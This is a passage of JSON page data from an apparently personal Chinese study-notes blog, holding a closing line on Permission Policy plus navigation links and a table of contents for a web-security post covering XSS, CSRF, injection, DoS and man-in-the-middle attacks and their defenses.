href=\"#feature-/-permission-policy\"></a></h4>\n<p>限制一个页面下，可以使用哪些功能</p>\n<p>iframe 也可以通过 allow=“xxx” 设置</p>\n","prev":{"title":"vue风格指南","link":"workNotes/工作笔记/vue 风格指南"},"next":{"title":"构建 webpack 知识体系 - 字节青训营","link":"learningNotes/青训营/12 李文杰 webpack"},"plink":"https://shylees.github.io/learningNotes/青训营/10 刘宇晨 web 开发的安全之旅/","toc":[{"id":"攻击者","title":"攻击者","index":"1","children":[{"id":"xss-—-cross-site-scripting","title":"XSS — Cross-Site Scripting","index":"1.1"},{"id":"csrf-跨站伪造请求-—-cross-site-request-forgery","title":"CSRF 跨站伪造请求 — Cross-site request forgery","index":"1.2"},{"id":"injection-注入","title":"Injection 注入","index":"1.3"},{"id":"dos-—-denial-of-service","title":"Dos — Denial of Service","index":"1.4"},{"id":"传输层-—-中间人攻击","title":"传输层 — 中间人攻击","index":"1.5"}]},{"id":"防御篇","title":"防御篇","index":"2","children":[{"id":"xss","title":"XSS","index":"2.1"},{"id":"csp---content-security-policy-内容安全策略","title":"CSP - Content Security Policy 内容安全策略","index":"2.2"},{"id":"csrf","title":"CSRF","index":"2.3"}]},{"id":"injection","title":"Injection","index":"3"},{"id":"dos","title":"DoS","index":"4"},{"id":"传输层-—-防御中间人","title":"传输层 — 防御中间人","index":"5"}],"copyright":{"custom":"不许转载😡！！！"},"reading_time":"2142 words in 11 min"}